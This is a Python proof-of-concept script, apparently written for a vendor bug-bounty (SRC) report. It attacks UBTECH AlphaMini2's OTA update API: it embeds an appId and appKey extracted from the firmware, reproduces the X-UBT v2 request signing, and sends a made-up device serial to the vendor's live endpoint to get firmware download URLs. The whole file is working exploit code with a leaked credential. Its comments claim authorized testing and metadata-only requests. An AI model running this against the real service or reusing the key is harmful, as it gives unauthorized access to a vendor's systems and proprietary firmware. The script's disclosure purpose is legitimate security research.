#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
UBTECH 悟空2代（AlphaMini2）OTA 固件枚举/下载 URL 获取 PoC
漏洞：固件内嵌 appId/appKey + 任意 deviceId(SN 槽位，无需真实存在) 即可查询并下载全量固件。
授权边界：仅用于 SRC 授权测试；脚本只请求元数据，不下载整包（下载只需浏览器打开返回的 packageUrl）。
"""
import hashlib
import json
import urllib.parse
import urllib.request
import uuid

# 来源：AlphaMini2 固件内 com.ubtrobot.mini.otaservice 的 BuildConfig（随 OTA 公开分发）
APP_ID = "980020069"
APP_KEY = "3763650528784c14a7723cd81d941ed0"
PRODUCT = "AlphaMini2"

TIMESTAMP_URL = "https://apis.ubtrobot.com/v1/client-auth-service/api/timestamp"
UPGRADABLE_URL = "https://apis.ubtrobot.com/v1/upgrade-rest/version/upgradable"


def server_timestamp() -> int:
    with urllib.request.urlopen(TIMESTAMP_URL, timeout=20) as r:
        j = json.loads(r.read().decode())
        data = j.get("data", j)
        return int(data if isinstance(data, int) else data.get("timestamp"))


def sign(app_key: str, device_id: str, ts: int, nonce: str) -> str:
    # X-UBT v2 签名：MD5(秒级ts + appKey + nonce8 + deviceId) + " ts nonce v2"
    return hashlib.md5(f"{ts}{app_key}{nonce}{device_id}".encode()).hexdigest() + f" {ts} {nonce} v2"


def query_upgradable(device_id: str, modules: dict, product: str = PRODUCT):
    """modules: {moduleName: currentVersion}，版本填低值（如 v0.0.0）即返回最新可升级包。"""
    ts = server_timestamp()
    nonce = uuid.uuid4().hex[:8]
    q = urllib.parse.urlencode({
        "productName": product,
        "moduleNames": ",".join(modules.keys()),
        "versionNames": ",".join(modules.values()),
    })
    headers = {
        "X-UBT-AppId": APP_ID,
        "X-UBT-DeviceId": device_id,          # 任意字符串均可，无需真实设备
        "X-UBT-Sign": sign(APP_KEY, device_id, ts, nonce),
        "X-UBT-Timestamp": str(ts),
        "X-UBT-Nonce": nonce,
    }
    req = urllib.request.Request(f"{UPGRADABLE_URL}?{q}", headers=headers)
    with urllib.request.urlopen(req, timeout=25) as r:
        return json.loads(r.read().decode())


if __name__ == "__main__":
    # 关键演示：deviceId 使用一个大概率不存在的 SN
    fake_sn = "<其他机器人设备_01>"
    result = query_upgradable(fake_sn, {"android": "v1.0.0.760", "mcu-app": "v0.0.0"})
    print(json.dumps(result, indent=2, ensure_ascii=False))
